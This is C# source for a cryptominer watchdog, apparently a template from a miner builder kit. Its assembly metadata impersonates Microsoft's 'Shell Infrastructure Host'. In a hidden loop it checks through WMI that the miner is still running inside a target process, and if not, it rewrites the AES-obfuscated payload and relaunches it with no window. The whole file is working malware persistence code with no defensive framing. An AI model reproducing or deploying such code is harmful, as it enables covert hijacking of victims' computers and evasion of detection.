using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

[assembly: Guid("%Guid%")]

public partial class RProgram
{
    public static byte[] rxM = { };
    public static int rcheckcount = 0;
    public static string rplp = PayloadPath;

    public static void Main()
    {
        try
        {
            rxM = RAES_Method(File.ReadAllBytes(rplp), true);
            RWDLoop();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
#endif
            Environment.Exit(0);
        }
    }

    public static void RWDLoop()
    {
        try
        {
            bool rarg2 = false;
            string rarg3 = Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#MINERID")));

            var rarg4 = new ConnectionOptions();
            rarg4.Impersonation = ImpersonationLevel.Impersonate;
            var rarg5 = new ManagementScope(@"\root\cimv2", rarg4);
            rarg5.Connect();

            var rarg7 = new ManagementObjectSearcher(rarg5, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#InjectionTarget")))))).Get();
            foreach (ManagementObject retObject in rarg7)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(rarg3))
                {
                    rarg2 = true;
                }
            }

            if (!File.Exists(rplp) || !rarg2)
            {
                if (!File.Exists(rplp) || rcheckcount > 2)
                {
                    rcheckcount = 0;
                    File.WriteAllBytes(rplp, RAES_Method(rxM));
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = rplp,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Path.GetDirectoryName(rplp),
                        CreateNoWindow = true,
                    });
                }
                else
                {
                    rcheckcount += 1;
                }

            }
            Thread.Sleep(startDelay * 1000 + 5000);
            RWDLoop();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
#endif
        }

    }

    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
    {
        var rarg3 = Encoding.ASCII.GetBytes("#IV");
        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), rarg3) : rarg5.CreateDecryptor(rarg4.GetBytes(16), rarg3);
        using (var rarg7 = new MemoryStream())
        {
            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
            {
                rarg8.Write(rarg1, 0, rarg1.Length);
                rarg8.Close();
            }
            return rarg7.ToArray();
        }
    }
}